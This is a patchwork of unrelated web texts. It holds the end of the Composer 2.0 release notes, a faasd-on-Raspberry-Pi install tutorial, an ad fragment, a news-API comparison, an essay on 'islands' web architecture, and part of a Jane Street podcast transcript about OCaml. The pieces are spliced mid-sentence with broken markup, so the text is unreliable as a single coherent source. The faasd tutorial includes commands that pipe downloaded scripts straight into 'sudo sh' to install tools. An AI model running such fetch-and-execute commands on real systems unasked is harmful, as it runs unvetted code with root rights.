refactored, which, for you, will result in more deterministic updates. The current local state of the vendor directory will not interfere in updates anymore. </p><p>After an update is complete, the install process is run automatically and it will now execute all network bound operations first - and in parallel if possible. This will avoid leaving you with a half-updated vendor directory if a network error occurs midway through installation.</p><h3 id="runtime-features">Runtime features</h3><p>We added a <a href="https://getcomposer.org/doc/07-runtime.md#platform-check">platform-check step</a> when <code>vendor/autoload.php</code> gets initialized which checks the current PHP version/extensions match what is expected by your dependencies and fails hard otherwise.</p><p>There is a new class, <code>Composer\InstalledVersions</code>, which is autoloaded in every project and is available at runtime. It allows you to check which packages/versions are present at runtime of your own project.</p><p>See the <a href="https://getcomposer.org/doc/07-runtime.md">runtime docs</a> for more details.</p><p>If your code relies on any of these runtime features, you should require <code>"composer-runtime-api": "^2.0"</code> in your composer.json. This is a virtual package which is provided by Composer and will make sure people have to use Composer 2.x to install your package.</p><h3 id="error-reporting-improvements">Error reporting improvements</h3><p>Because things don't always go the way they're supposed to, we made sure to improve the error reporting shown to you when dependencies cannot be resolved. It's hard to give concrete examples here as there are a million ways this can fail but you will hopefully notice that messages are now shorter, clearer and less repetitive.</p><h3 id="partial-updates-with-temporary-constraints">Partial updates with temporary constraints</h3><p>Sometimes it can be useful to upgrade or downgrade a single package to a specific version, perhaps temporarily to test something or wait for a bug fix. You can now run <code>composer update vendor/package:1.0.*</code> for example (or <code>1.0.12</code> or any other version constraint), to run an update of only <code>vendor/package</code> to a version matching this additional constraint. This will not update your require in composer.json, and it will not mark the lock file out of date.</p><p>If you want to add/restrict a constraint but still do a full update of all dependencies, you can use <code>update --with vendor/package:1.0.*</code> which will run the update with that additional constraint.</p><h2 id="2-how-easy-is-it-to-upgrade">2/ How easy is it to upgrade?</h2><p>Our goal is that every Composer user can upgrade smoothly and swiftly. The gains are huge and we want everyone to benefit from them. To achieve that we did a few things:</p><ul><li>Composer 2.0 still supports PHP 5.3 and above, much like Composer 1.x</li><li><code>composer.lock</code> files are interoperable between versions, so you can upgrade to 2.0 and roll back easily if needed.</li><li>Most commands and arguments remain the same, and largely what you know about Composer remains true in 2.0.</li></ul><p>If you run <code>composer self-update</code> from 1.x, it will warn you that a new stable major version of Composer is available, and you can use <code>composer self-update --2</code> to migrate to it.</p><p>Should you encounter issues, you can go back at any time by using <code>composer self-update --1</code>. Hopefully that will make everyone feel comfortable to experiment with the new release.</p><p>If you are <a href="https://getcomposer.org/doc/faqs/how-to-install-composer-programmatically.md">installing Composer automatically</a> from the installer script, and wish to remain on Composer 1.x for the time being, you can also pass it a <code>--1</code> argument to prevent it from installing Composer 2.0 by default. If you do this please remember and aim to upgrade in a timely manner, as Composer 1.x will not be maintained for very long.</p><h2 id="3-backwards-compatibility-breaks">3/ Backwards compatibility breaks?</h2><p>Here are the main things likely to cause trouble with the upgrade process:</p><ul><li><strong>Plugins</strong>: This is probably going to be the major source of problems for most people. Plugins need to be updated to support Composer 2, and some of them are not ready, yet. Composer 2 will complain and fail to resolve dependencies if a plugin does not support it, so no need to overthink it, you can try it out and see how it goes.</li><li>The new <strong>platform-check feature</strong> means that Composer checks the runtime PHP version and available extensions to ensure they match the project dependencies. If a mismatch is found, the autoloader exits with error details to make sure problems are not overlooked. To avoid issues when deploying to production it is recommended to run <code>composer check-platform-reqs --no-dev</code> with the production PHP process as part of your build or deployment process.</li><li><strong>Repository priority</strong>: If a package exists in a higher priority repository, it will now be entirely ignored in lower priority repositories. If you seem to be missing packages when using Composer 2, see <a href="https://getcomposer.org/repoprio">repository priorities docs</a> for details.</li><li><strong>Invalid PSR-0 / PSR-4 configurations</strong> will not autoload anymore in optimized-autoloader mode, as per the warnings introduced in Composer 1.10. Mostly these warnings were for classes that were not meant to autoload anyway so I don't expect major issues, but it's safer to clean these up before upgrading.</li></ul><p>If you want to know more, I would highly recommend reading the <a href="https://github.com/composer/composer/blob/master/UPGRADE-2.0.md">UPGRADE</a> guide which has multiple sections for end users, plugin authors and Composer repository implementors.</p><h2 id="4-what-s-next">4/ What's next?</h2><p>We don't have a very detailed feature roadmap anymore as 2.0 contains tons of new goodies, but one important thing I want to explain is our PHP version support going forward.</p><p>As I mentioned above, Composer 2.0 supports PHP 5.3+, which is at this point very outdated and makes the code quite hard to maintain in places. We went through the effort to make sure every Composer user can upgrade to Composer 2, but the plan is to drop support for EOL PHP versions in a future minor release.</p><p>Composer 2.1 might still come with PHP 5.3 support, depending on the timeline and which features end up being included, but then at the latest by Composer 2.2 we will drop support for everything older than PHP 7.1.3. According to our stats this allows over 90% of the Composer users to use the latest version, and for the others who are stuck on outdated PHP versions we will keep providing critical bug and security fixes in the 2.0.x or 2.1.x range.</p><p>As for Composer 1.x, it is now more or less EOL. It will also receive critical fixes if anything comes up but the goal for everyone should be to migrate to 2.x as soon as possible.</p><p>Finally I want to thank everyone who contributed and helped make this a reality. The 2.0 release represents over 1100 commits from 28 people, 150+ GitHub issues and pull requests, plus everyone who test it, reviewed PRs, etc. It has been a huge effort with the first commits made about two years ago.</p><p>I also want to thank all our <a href="https://packagist.com/">Private Packagist</a> customers who helped finance this effort and afforded us the time we spent on all this. We sincerely hope everyone will appreciate the result!</p>

            <div><p>Kick the tires with faasd today, for a lightweight serverless experience that doesn't require Kubernetes. Instead it uses containerd and the existing OpenFaaS ecosystem.</p>
<blockquote>
<p>Last updated: 24th October 2020 - upgraded faasd &amp; containerd versions. Added instructions for core components logs such as the gateway.</p>
</blockquote>
<p>You can run <a href="https://github.com/openfaas/faasd">faasd</a> anywhere, even on a <a href="https://www.raspberrypi.org/">Raspberry Pi</a>, but why would you want to do that? faasd offers many of the benefits of containers and <a href="https://github.com/openfaas/faas">OpenFaaS</a>, but without the complexity and operational costs of Kubernetes. <a href="https://github.com/containerd/containerd">containerd</a> is a low-level tool for automating containers, and a <a href="https://landscape.cncf.io/">CNCF project</a>.</p>
<p><img src="https://blog.alexellis.io/content/images/2019/12/ofctr.png" alt="OpenFaaS and containerd logos"></p>
<p>The use-cases for <a href="https://blog.alexellis.io/introducing-functions-as-a-service/">Serverless / FaaS are fairly well-known</a>, but you could use faasd at the edge, in a smart-car, as part of an IoT device, for crunching data before uploading samples to the cloud, for webhook receivers/alerting, bots, webservices, API integrations or even providing your own APIs. Compute is compute, and OpenFaaS with containerd makes it easy to both consume and provide.</p>
<blockquote>
<p>🚀 Support the development of faasd - <a href="https://github.com/sponsors/openfaas">Sponsor OpenFaaS on GitHub</a><br>
⭐️ Star or fork <a href="https://github.com/openfaas/faasd">faasd on GitHub</a></p>
</blockquote>
<h2 id="beforewestart">Before we start</h2>
<p>Use Raspbian Lite (now called RaspiOS) for this tutorial. Do not install Docker on the same Raspberry Pi as it may cause conflicts with networking and the version of containerd we are using.</p>
<p>You should use RPi 2, 3 or 4. If you have only one Raspberry Pi, then you'll be able to deploy pre-built images from the OpenFaaS Function Store, but if you have a second Raspberry Pi, then you can use it to build new functions too.</p>
<p>You can also deploy to a PC or cloud VM:</p>
<ul>
<li><a href="https://www.openfaas.com/blog/faasd-tls-terraform/">Deploy faasd to DigitalOcean with Terraform</a></li>
<li><a href="https://github.com/openfaas/faasd/blob/master/docs/MULTIPASS.md">Deploy faasd to your laptop with Multipass</a></li>
</ul>
<h2 id="installation">Installation</h2>
<p>Installation only takes a few moments, and in the future should be quicker if we can secure binaries for containerd from the upstream project.</p>
<h3 id="getfaascli">Get <code>faas-cli</code></h3>
<p>The <a href="https://github.com/openfaas/faas-cli/">faas-cli</a> can be used to build, deploy, manage, and invoke functions with OpenFaaS. OpenFaaS offers a REST API, asynchronous invocations, authentication, metrics, and a UI out of the box.</p>
<p>Install using the utility script, or alternatively the binaries are also available on the <a href="https://github.com/openfaas/faas-cli/releases">releases page</a>.</p>
<pre><code># Install to local directory
curl -sLfS https://cli.openfaas.com | sh
sudo mv faas-cli to /usr/local/bin

# Or run with sudo to move to /usr/local/bin in one step
curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<p>See also: <a href="https://docs.openfaas.com/">OpenFaaS docs</a></p>
<h3 id="getcontainerd">Get containerd</h3>
<p>Unfortunately the <a href="https://github.com/containerd/containerd">containerd</a> maintainers only provide binaries for <code>x86_64</code> (regular PCs), so we have to install Go and build containerd from source.</p>
<p>We'll install some dependencies that will help us in the tutorial and after installation</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    runc \
    bridge-utils \
    tmux \
    git
</code></pre>
<p>Pick option A or B.</p>
<h4 id="ausemycontainerdarmhfbinariesfast">A) Use my containerd armhf binaries (fast)</h4>
<p>I have compiled binaries for containerd, which you can use if you wish. <a href="https://github.com/alexellis/containerd-armhf/releases">alexellis/containerd/armhf</a>.</p>
<pre><code>curl -sSL https://github.com/alexellis/containerd-arm/releases/download/v1.3.5/containerd-1.3.5-linux-armhf.tar.gz | sudo tar -xvz --strip-components=1 -C /usr/local/bin/
</code></pre>
<h4 id="bbuildyourowncontainerdbinariesslow">B) Build your own containerd binaries (slow)</h4>
<p>Raspbian needs a few additional build-time dependencies for containerd:</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    build-essential \
    libbtrfs-dev \
    libseccomp-dev
</code></pre>
<p>You can use my utility script to build containerd now:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas
git clone https://github.com/openfaas/faasd

cd cd faasd

./hack/build-containerd-armhf.sh
</code></pre>
<p>This could take a few moments on RPi2 or 3, and is a little quicker on RPi4.</p>
<h3 id="configurecontainerdtostartonboot">Configure containerd to start on boot</h3>
<p>Install a systemd unit file for <code>containerd</code>:</p>
<pre><code>curl -SLfs https://raw.githubusercontent.com/containerd/containerd/v1.3.5/containerd.service | sudo tee /etc/systemd/system/containerd.service

sudo systemctl enable containerd
sudo systemctl start containerd
</code></pre>
<p>Check that <code>containerd</code> started with <code>sudo systemctl status containerd</code>, if not then you may need to <code>unmask</code> it and run the commands again. See <a href="https://blog.ruanbekker.com/blog/2017/12/09/unmask-a-masked-service-in-systemd/">unmasking a service</a>.</p>
<h3 id="installnetworking">Install networking</h3>
<ul>
<li>
<p>Enable the Kernel's bridge module</p>
<pre><code># One-off
sudo modprobe br_netfilter &amp;&amp; \
sudo sysctl net.bridge.bridge-nf-call-iptables=1

# Make it permanent
echo "br_netfilter" | sudo tee -a /etc/modules-load.d/modules.conf

echo "net.bridge.bridge-nf-call-iptables=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
</li>
<li>
<p>Install CNI plugins</p>
<p>Fortunately there are upstream ARM binaries available for the CNI plugins.</p>
<pre><code>sudo mkdir -p /opt/cni/bin

curl -sSL https://github.com/containernetworking/plugins/releases/download/v0.8.5/cni-plugins-linux-arm-v0.8.5.tgz | sudo tar -xz -C /opt/cni/bin
</code></pre>
</li>
<li>
<p>Enable NAT</p>
<p>Enable NAT between the container network and your wider network and the Internet:</p>
<pre><code>sudo /sbin/sysctl -w net.ipv4.conf.all.forwarding=1

echo "net.ipv4.conf.all.forwarding=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
<p>Optional step - if you have Docker running on your system, then disable it and reboot at this point.</p>
<pre><code>sudo systemctl disable docker
sudo systemctl disable docker.sock # or docker.socket - You may also need this step
</code></pre>
<p>Docker's IP address range conflicts with the one chosen by netns, this will be resolved when moving to CNI.</p>
</li>
</ul>
<h3 id="getfaasd">Get <code>faasd</code></h3>
<p>faasd is a Go binary that runs on your system and packages all of OpenFaaS, it's a similar tool to docker-compose.</p>
<p>One of faasd's commands <code>faasd provider</code> runs an OpenFaaS provider which implements the OpenFaaS "CRUD" API for functions.</p>
<p>Clean-up old versions, if required:</p>
<pre><code># Stop systemd services, if you have them
sudo systemctl stop faasd
sudo systemctl stop faasd-provider

# Remove old binaries if you have them
sudo rm -rf /usr/local/bin/faasd
</code></pre>
<p>Download the faasd binary:</p>
<pre><code>sudo curl -sSLf "https://github.com/openfaas/faasd/releases/download/0.9.5/faasd-armhf" \
    --output "/usr/local/bin/faasd" \
    &amp;&amp; sudo chmod a+x "/usr/local/bin/faasd"
</code></pre>
<p>Now run the installation:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir -p $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas

git clone https://github.com/openfaas/faasd --depth=1

cd faasd

sudo faasd install
</code></pre>
<h2 id="postinstall">Post-install</h2>
<p>The <code>faasd install</code> command creates two systemd unit files which can be used to start/stop <code>faasd</code> and <code>faasd-provider</code>.</p>
<h3 id="checktheinstallation">Check the installation</h3>
<p>Check the services:</p>
<pre><code>sudo systemctl status faasd
sudo systemctl status faasd-provider
</code></pre>
<p>Find logs:</p>
<pre><code>sudo journalctl -u faasd --lines 40
sudo journalctl -u faasd-provider --lines 40
</code></pre>
<p>You'll find your login details for the gateway in <code>/var/lib/faasd/secrets</code>, the user is <code>admin</code> and the password is in <code>/var/lib/faasd/secrets/basic-auth-password</code></p>
<h3 id="checkthelogsfromtheopenfaascoreservices">Check the logs from the OpenFaaS Core Services</h3>
<p>You can access the logs from any of the core services deployed with faasd as follows:</p>
<pre><code>sudo journalctl -t default:gateway --lines 40
sudo journalctl -t default:nats --lines 40
sudo journalctl -t default:queue-worker --lines 40
sudo journalctl -t default:prometheus --lines 40
</code></pre>
<p>For more, see the <code>docker-compose.yaml</code> file in the current directory.</p>
<h3 id="accessopenfaasfromyourlaptop">Access OpenFaaS from your laptop</h3>
<p>faasd deploys OpenFaaS along with its core logic <code>faasd-provider</code>, which uses containerd instead of Kubernetes to start, stop, and manage functions.</p>
<p>The <code>faasd</code> process will proxy any incoming requests on HTTP port 8080 to the OpenFaaS gateway container, you can also find the IP of the container in your <code>hosts</code> file in the <code>faasd</code> directory.</p>
<p>You can also access the built-in Prometheus container by editing <code>docker-compose.yaml</code> to expose its ports, either to 127.0.0.1, or all your network adapters.</p>
<h3 id="deployafunctionfromthestore">Deploy a function from the store</h3>
<p>Obtain your OpenFaaS password. You need to run this command on your Raspberry Pi:</p>
<pre><code>sudo cat /var/lib/faasd/secrets/basic-auth-password
</code></pre>
<p>Log in to the gateway, either on your RPi, or from your own computer.</p>
<pre><code># If connecting remotely
export IP=192.168.0.101
export OPENFAAS_URL=http://$IP:8080
echo $PASSWORD | faas-cli login

# Or on device:

sudo cat /var/lib/faasd/secrets/basic-auth-password | faas-cli login --password-stdin
</code></pre>
<p>Look at what's available in the function store for the armhf platform, then deploy something:</p>
<pre><code>faas-cli store list --platform armhf

# Deploy figlet
faas-cli store deploy --platform armhf figlet

# Find the URLs for the function
faas-cli store inspect figlet

# Create some ASCII

echo "faasd" | faas-cli invoke figlet
</code></pre>
<p>Try a function that can generate an <code>identicon</code> like you may have seen for default avatar logos on GitHub.com</p>
<pre><code>faas-cli store deploy --platform armhf identicon

echo $USER | faas-cli invoke identicon &gt; avatar.png
</code></pre>
<p>Here's an example of the avatar for the user <code>pi</code>:</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/avatar.png" alt="avatar"></p>
<h3 id="runanasyncfunction">Run an async function</h3>
<p>You can also run your functions in the background or asynchronously.</p>
<p>Create a webhook receiver using a public service such as:</p>
<ul>
<li><a href="https://requestbin.com/">https://requestbin.com/</a></li>
<li><a href="https://postb.in/">https://postb.in/</a></li>
</ul>
<pre><code>faas-cli store deploy --platform armhf nodeinfo

curl -d "verbose" \
  http://127.0.0.1:8080/async-function/nodeinfo \
  --header "X-Callback-Url: https://postb.in/1578562711776-8760500776115"
</code></pre>
<p>You'll be able to refresh your webhook receiver and see the value.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/Screenshot-2020-01-09-at-09.41.11.png" alt="Screenshot-2020-01-09-at-09.41.11"></p>
<h3 id="buildanewcontainerimage">Build a new container image</h3>
<p>You'll need a second Raspberry Pi for this step since we do not have <code>docker</code> installed on the device.</p>
<p>There are a couple of workarounds if you don't have a second device: use buildkit per as my post <a href="https://blog.alexellis.io/building-containers-without-docker/">Building containers without Docker</a>. Or build on your PC using <a href="https://github.com/alexellis/multiarch-templates">one of my multi-arch templates</a>.</p>
<p>You can also use one of my prebuilt functions such as <a href="https://github.com/alexellis/2020/">ascii-2020</a>, but you should only run the <code>faas-cli deploy</code> step.</p>
<ul>
<li>
<p>Log into the Raspberry Pi with <code>ssh</code> and install the <code>faas-cli</code> and <code>docker</code>.</p>
<pre><code>curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<pre><code>curl -sLfS https://get.docker.com | sudo sh

sudo usermod -aG docker pi
newgrp
</code></pre>
</li>
<li>
<p>Log into the Docker Hub</p>
<pre><code>docker login
</code></pre>
</li>
<li>
<p>Create a Golang function</p>
<pre><code>export DOCKER_HUB_NAME="alexellis2"

faas-cli template store pull golang-middleware

faas-cli new --lang golang-middleware \
  hello-world \
  --prefix $DOCKER_HUB_NAME
</code></pre>
</li>
<li>
<p>Now build and push the image</p>
<pre><code>faas-cli push -f hello-world.yml
faas-cli deploy -f hello-world.yml
</code></pre>
</li>
</ul>

They should be on your Freebie List too.</h2></div></div><div><div><h3>DoNotPay</h3><p>The DoNotPay app is the home of the world's first robot lawyer.

Team is known to have an unheard of product-shipping cadence, delivering new (great) products to users consistently.<br>• You enjoy high momentum &amp; impact.

              News information is important for many different use cases from brand monitoring to trend discovery to financial news monitoring. Many companies rely on news monitoring to find new opportunities in the markets, including new clients.
            </p>

              The most popular use cases include:

            <p>
              For the most basic use cases <a href="https://news.google.com/">Google News</a> or <a href="https://www.google.com/alerts">Google Alerts</a> may be enough, but both of these services have many limitations that prevent them from being used on a bigger scale.
            </p>
            <p>
              Unfortunately Google News does not provide a convenient way to retrieve a big amount of relevant data, as it poses a strict limit on the number of articles that could be retrieved per query. Yet another concern is rate limiting restrictions. Google News is primarily focused on human users, not robots, therefore you risk getting your ip banned when trying to make a large amount of queries programmatically.
            </p>
            <p>
              The search interface is also far from perfect, as it does not allow building complex queries, in contrast to
              <a href="https://www.elastic.co/what-is/elasticsearch">modern full-text search storage solutions</a>, which provide a wide variety of operators for building search queries of almost any complexity.

            <!-- Text -->
            <p>
              Let’s go over the main features and make a side-by-side comparison with Google News.
            </p>

            <ul>
              <li>

                <!-- Text -->
                <h3>
                  Maximum number of articles returned per query.
                </h3>

                <ul>
                  <li>
                    Google News has a max limit of <span>100</span> articles per query without any possibility to retrieve more. This may be a big limitation if the search keyword is very popular and may contain thousands or even tens of thousands of relevant articles.
                  </li>
                  <li>
                    In contrast, Datanews News API provides access to <span>all of the relevant articles whenever they were published</span>. The API uses
                    <a href="https://en.wikipedia.org/wiki/Pagination">pagination</a> for efficient transfer of a large amount of articles through the network.
                  </li>
                </ul>
              </li>

              <li>

                <!-- Text -->
                <h3>
                  Available news article metadata.
                </h3>

                <ul>
                  <li>
                    Google News provides a limited amount of metadata about each particular article. It usually includes the publication date, description field, title and the original article link.
                  </li>
                  <li>
                    Datanews API returns more additional information about each article, which is directly extracted from webpage: original article link, title, description, publication date, domain of the publication, url of the image on the article page, <span>list of authors</span>, language, country, <span>snippet of the content</span>.
                  </li>

              Choosing between <a href="https://news.google.com/">Google News</a> and other News API is really about your use case. If you need something simple just for personal use, then going with Google News or Google Alerts will make perfect sense.
            </p>
            <p>
              Otherwise, if you plan to build some software system with bigger scale, then going with an existing news API provider like <a href="https://datanews.io/">Datanews</a> will make more sense. It will provide you with a reliable and complete news monitoring solution that is ready to be integrated into your product.

<p>I’ve struggled to find references to this online, but heard the name used multiple times this year when describing the approach outlined here.</p>

<p>The general idea of an “Islands” architecture is deceptively simple: render HTML pages on the server, and inject placeholders or slots around highly dynamic regions. These placeholders/slots contain the server-rendered HTML output from their corresponding widget. They denote regions that can then be "hydrated" on the client into small self-contained widgets, reusing their server-rendered initial HTML.</p>

<p>You can think of this like a static HTML document that contains multiple separate embedded applications:</p>

<p>  
<img width="600" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-1.png">  
</p>

<p>This may seem similar to "micro-frontends" at first glance. Both approaches share the idea of breaking applications up into independent units, however "micro-frontends" do not typically imply that composition of those units is achieved using HTML.</p>

<p>A closer analog to the "islands" approach would be progressive enhancement, to which we're essentially adding SSR hydration and a consistent metaphor for adding interactivity to a region of the page. In traditional progressive enhancement, we might have a <code>&lt;script&gt;</code> that looks for an image carousel in the page and instantiates a jQuery plugin on it. Instead, that image carousel would be rendered on the server and a dedicated <code>&lt;script&gt;</code> emitted for it that loads the image carousel implementation and in-place upgrades it to be interactive.</p>

<h3 id="whydoesthismatter">Why does this matter?</h3>

<p>As it turns out, there are a number of benefits to the group of approaches described here when compared to typical Single Page Application architectures.</p>

<h5 id="progressivehydrationforfree">"Progressive Hydration" for free</h5>

<p>I’ve touted the performance benefits of <a href="https://www.youtube.com/watch?v=k-A2VfuUROg">Progressive Hydration</a> techniques for frameworks like React, Angular, Preact and Vue. With these architectures, individual widgets on a page are loaded and initialized over time. This can be done using a simple scheduling approach via requestIdleCallback, or can take additional factors into account like viewport visibility, interaction likelihood, product value, etc.</p>

<p>Similar to Progressive Hydration, rendering pages using an islands architecture results in the heavier dynamic portions of the page being initialized not just progressively, but <em>separately</em>. This means individual regions of the page become interactive without anything else on the page needing to be loaded first.</p>

<p>Unlike Progressive Hydration, the approaches that fall out of building around an islands architecture do not require top-down rendering. This is a distinct advantage, since there are no outer “root” components that must be initialized before their descendants. Each part of the page is an isolated unit, and a performance issue in one unit doesn't affect the others.</p>

<h5 id="seoanduxarentatradeoff">SEO and UX aren’t a tradeoff</h5>

<p>The status quo for SSR as used by Single Page Applications is that it’s often cited as a necessity for SEO reasons. However, SSR can actually have a net <em>negative</em> impact on User Experience - visitors are left waiting for the actual functionality of a page to arrive while staring at a frustratingly fake version of that page.</p>

<p>Many applications also suffer from silent SSR performance pitfalls without realizing it. In virtual DOM libraries, it's easy (and common) to accidentally construct a situation where first render destroys the server-rendered HTML DOM, only to recreate it again from scratch (often synchronously). This is the result of some common misconceptions, which may stem from documentation giving an idealized view of hydration while passing over tricky caveats and footguns.</p>

<p>Even in cases where SSR hydration is functioning as designed, the status quo leaves a lot to be desired. The amount of JavaScript work being performed during page load is still many orders of magnitude more than what might be considered "efficient".</p>

</figure>

<p>In an "islands" model, server rendering is not a bolt-on optimization aimed at improving SEO or UX. Instead, it is a fundamental part of how pages are delivered to the browser. The HTML returned in response to navigation contains a meaningful and immediately renderable representation of the content the user requested.</p>

<p>Sections of that HTML may be missing their client-side interactivity, but the document should at least contain the most essential content. For example: a news page’s HTML would contain the article body, and a product page would contain that product’s description.</p>

<p>All of the other content is secondary to this information, and its inclusion in the HTML becomes a product decision. How vital is this bit of information to a user visiting the page? How important is that widget to the business model? A "buy now" button that directly relates to revenue should be easily prioritized over a site feedback survey button that relates to information gathering.</p>

<h5 id="betterforaccessibilityanddiscoverability">Better for accessibility and discoverability</h5>

<p>A website that uses standard HTML links for navigation is easier for assistive technologies and web crawlers to use. This is true regardless of whether links or forms are intercepted by JavaScript and rerouted to client-side logic, because the underlying assumptions remain true: clicking a link navigates to the given page.</p>

<p>Anecdotally, think of the number of times you’ve been sent a “link” to what the sender assumed was the page they were viewing, only to realize the link contained none of the necessary information:</p>

<p>  
<img width="350" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-3.png">  
</p>

<p>Building page-based applications doesn't completely prevent these types of strange experiences, it only makes the decision to do so more direct. It makes the default outcome the accessible one.</p>

<hr>

<p>When it comes down to it, shipping an architecture that requires less code to do something is the type of long-term benefit your future self (or coworkers) will thank you for. It's possible — likely, even — that adopting a model like this requires more up-front design thinking. There are far few batteries-included options available for decomposing apps into independently deliverable widgets. Who knows, maybe we can fix that.</p>

		<h2 id="000000">00:00:00</h2>

<div><p>Welcome to Signals And Threads, in-depth conversations about every layer of the tech stack from Jane Street. I’m Ron Minsky. </p><p> Today, we’re going to have a conversation about programming language design with Leo White. Leo works in our compilers team here at Jane Street, and he works mostly on what’s called the frontend of the compiler, which means he spends a lot of time thinking about language features and about the type system that supports those language features, and in particular, he does that work in OCaml, which is the programming language we use on a day-to-day basis. </p><p> So, Leo, to get started, I’m curious, can you tell us a little bit about how you got involved in all of this? How you got involved in programming language design, in the first place?</p></div>

<h2 id="0000400">00:00:40.0</h2>

<div><p>I had some interest in programming languages from a young age. I started programming at 11 or something, and then I think I was fairly interested in how these mysterious things were created. The most formative thing I can think of in this regard, is between my first and second years at university, I remember reading Benjamin Pierce’s <a href="https://www.cis.upenn.edu/~bcpierce/tapl/"><em>Types and Programming Languages</em></a>. That really clicked. I just thought that stuff was great and I just really wanted work on it, and explore those ideas. </p><p> So, I think that’s kind of one of the main things that got me into it. I knew I wanted to do some programming language stuff, I started doing a PhD in that area. It was more about compilation than programming language design, and I was working on a source-to-source C compiler, and I was writing that compiler in OCaml, because OCaml had a good library for reading C files, and I already knew Standard ML, because it’s what they teach you in the first year at Cambridge. So, anyways, I was using OCaml to write this compiler, and I realized that there was a language feature that I wanted to have that would make it easier for me to write this C compiler, and since I kind of hated the work I was doing on the C compiler and was not that interested in it, I procrastinated by adding this feature to OCaml instead. And that’s kind of how I got into writing code for the OCaml compiler. So, I was writing, this language feature and went through the process of trying to upstream it, and whilst I was doing that and my PhD was coming to an end, Anil Madhavapeddy was looking around for people to join OCaml Labs, which was this new project to work on the OCaml compiler that Jane Street was kind of funding in Cambridge. So, he was trying to look for people to work on the OCaml compiler and suddenly this Cambridge address shows up with the implementing language features for OCaml and so he thought, well, I should go and see this person. So, he got in touch with me. And that’s kind of how I started working at OCaml Labs as an RA after having finished my PhD.</p></div>

<h2 id="0002195">00:02:19.5</h2>

<p>It’s by the way worth noting that most people have the wisdom to not immediately go and dive into adding features to languages that they’re just starting to use, and in particular, diving into the type system. I think when Anil saw someone who was willing to just going in and add a new type system feature, he was pretty excited.</p>

<h2 id="0002346">00:02:34.6</h2>

<p>Yes. I did not realize at the time that this wasn’t something that you just did. Yes, I was somewhat under-supervised in my PhD and clearly, no one told me that this is a terrible idea, and a bad way to spend your time. So, I just went ahead and did it instead, and I really enjoyed it. I mean, it’s quite a terrible…like, the type system is hard to dive into. I would not recommend doing it without some assistance.</p>

<h2 id="0002568">00:02:56.8</h2>

<p>The thing you mentioned about how you got involved in OCaml, is the thing that’s always worried me a little bit about how languages are designed, which is to say, languages are almost inevitably designed by people who write compilers, and so, they go around and look at the features they would like for writing compilers and go ahead and add them to the language, and I always wondered, like, how much of a bias is this in how our languages are designed?</p>

<h2 id="0003178">00:03:17.8</h2>

<p>I would say, not much of one mostly, because that is probably a fair accusation of OCaml, which is very nice for writing compilers and has all the things you would want for writing a compiler, but that is not true of most languages. Most languages are kind of horrible to write compilers in, so I don’t think it’s applying there.</p>

<h2 id="0003327">00:03:32.7</h2>

<p>So, you got excited about programming language design from reading <em>Types and Programming Languages</em>, which is Benjamin Pierce’s extremely famous book in this area, or at least extremely famous in an extremely narrow group of people, and you’ve been doing it now for quite a while. Some of that work during your PhD. Some at OCaml Labs, and a bunch of it here, in the intermediate time. What do you find exciting about language design? Why do you like it?</p>

<h2 id="0003550">00:03:55.0</h2>

<p>One of the main things I think I like about language design is that it sits at an interesting intersection between some very interesting pure mathematics, especially on the type system design side of things, and a more aesthetic, kind of, design style. A lot of it is about trying to find things that fit within the mathematical constraints, but are also a design that people like aesthetically and enjoy using.</p>

<h2 id="0004166">00:04:16.6</h2>

<p>And this is one of the real challenges of programming language design. It is really not, at its heart, a scientific enterprise, or at least, not at the end. This is a thing you often hear programming language people complain about, is the fact that they can’t do any proper studies, or rather, whether they can or can’t do it, that in practice, that is not how the field is driven.</p>

<h2 id="0004365">00:04:36.5</h2>

<p>Some people do try and do studies in how effective a programming language is, but it kind of hits up against all the things that make it hard to do experiments in the social sciences. It’s just seems like, in principle, you can manage it, but the experiments are just very hard to do, right? What you really need to do is get a load of professional programmers to agree to use all these different languages to solve the same problems for a prolonged period of time, and clearly this isn’t going to happen.</p>

<h2 id="0004566">00:04:56.6</h2>

<p>Yeah, it does seem completely and utterly hopeless to me because, if the things you care about are what you can do in a programming language, with large groups of people, solving hard problems, with significant amounts of time being devoted to it, which seems like, to me, at least, the interesting problem, and I think, a problem that a lot of programming languages are not even motivated by, you just have no hope. Like the kind of experiments people can run in practice, are like, they grab the thing they have at hand, which is usually a collection of sophomores, and then they study the thing that they can, which is something like how easy is it to understand the very first errors they see in their language or like, how well do they do when they try and do stuff in their first few weeks or maybe few months of working at it. And that just doesn’t get at the actual thing you care about when you think about what makes programming effective in the real world.</p>

<h2 id="0005434">00:05:43.4</h2>

<div><p>This kind of genuinely bothers quite a lot of people, I think, who work in programming languages. They really would much prefer that it were a proper science. It’s much better thought of as a kind of intersection between some mathematics and design. </p><p> And those are both things that we know how to study, right? The scientific method is not the only approach to knowledge. With mathematics, you can try to prove useful theorems and interesting properties, and people successfully do research in design disciplines like, my favorite example is really architecture, which I think is a very similar area to programming language design, in that it’s kind of constrained by mathematics. You know, you have to make sure the building stays up and also, is interesting from a design perspective. You know, you want to make buildings that people enjoy being in and looking at, and so on.</p></div>

<h2 id="0006249">00:06:24.9</h2>

<p>And there’s more than just the raw structural things you have to check. When you think about the design of a building, you think about what are transit times, and people do all sorts of studies to try get feels for how effective it is, but in the end, no one thinks that the final way to figure out whether a building is good is to do a randomized control trial, where you’re like, you make four different buildings and you have this, this and this. You have four equivalent businesses that you sit in the four different buildings and you see how it goes. And I think the scale of the economic investment required, I’m not sure if it’s not quite as absurd or a little more absurd to do the programming language equivalent, but it’s up there.</p>

<h2 id="0007013">00:07:01.3</h2>

<p>I think that that’s a better way of looking at programming language design, as a discipline.</p>

<h2 id="0007068">00:07:06.8</h2>

